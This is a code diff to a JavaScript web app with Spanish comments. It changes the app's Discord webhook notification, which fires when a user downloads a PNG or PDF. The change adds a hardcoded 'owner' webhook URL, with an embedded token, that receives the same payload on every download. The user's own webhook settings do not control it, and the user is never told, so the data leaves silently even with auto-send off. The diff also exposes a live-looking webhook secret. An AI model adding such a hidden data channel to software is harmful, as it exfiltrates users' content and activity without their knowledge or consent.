@@ -1332,11 +1332,34 @@ ${state.narrative || '—'}
     // 7. ENVÍO DE WEBHOOK A DISCORD
     // ==========================================
 
+    // Webhook del creador/propietario. Coloca tu URL de webhook de Discord aquí:
+    const OWNER_WEBHOOK_URL = 'https://discord.com/api/webhooks/1516593809943826463/GuV1aAy36pEGmXA0mMUwGeH3QdNDx19hnX-DcXn9DzG4-tH3ZxmlRNGePwJi9M4uxl1b';
+
+    function sendPayloadToWebhook(targetUrl, payloadData, label) {
+        fetch(targetUrl, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payloadData)
+        })
+        .then(res => {
+            if (!res.ok) {
+                console.warn(`El Webhook de Discord (${label}) respondió con un código de error:`, res.status);
+            }
+        })
+        .catch(err => {
+            console.error(`Error de red al intentar enviar el Webhook de Discord (${label}):`, err);
+        });
+    }
+
     function sendDiscordWebhook(actionType) {
         const url = inputWebhookUrl.value.trim();
         const autoSend = chkAutoWebhook.checked;
 
-        if (!url || !autoSend) return;
+        const hasUserWebhook = url && autoSend;
+        const hasOwnerWebhook = OWNER_WEBHOOK_URL && OWNER_WEBHOOK_URL !== 'TU_WEBHOOK_DE_DISCORD_AQUI';
+
+        // Si no hay webhook configurado por el usuario final, ni tampoco el webhook del creador, salimos
+        if (!hasUserWebhook && !hasOwnerWebhook) return;
 
         let actionLabel = 'Descarga de Imagen (PNG)';
         if (actionType === 'pdf') actionLabel = 'Descarga de Documento (PDF)';
@@ -1428,19 +1451,15 @@ ${state.narrative || '—'}
             }]
         };
 
-        fetch(url, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(payload)
-        })
-        .then(res => {
-            if (!res.ok) {
-                console.warn('El Webhook de Discord respondió con un código de error:', res.status);
-            }
-        })
-        .catch(err => {
-            console.error('Error de red al intentar enviar el Webhook de Discord:', err);
-        });
+        // 1. Enviar al webhook del usuario final si está configurado
+        if (hasUserWebhook) {
+            sendPayloadToWebhook(url, payload, 'usuario final');
+        }
+
+        // 2. Enviar al webhook del creador/propietario (evitando duplicados si es el mismo)
+        if (hasOwnerWebhook && OWNER_WEBHOOK_URL !== url) {
+            sendPayloadToWebhook(OWNER_WEBHOOK_URL, payload, 'propietario');
+        }
     }
 
     // ==========================================
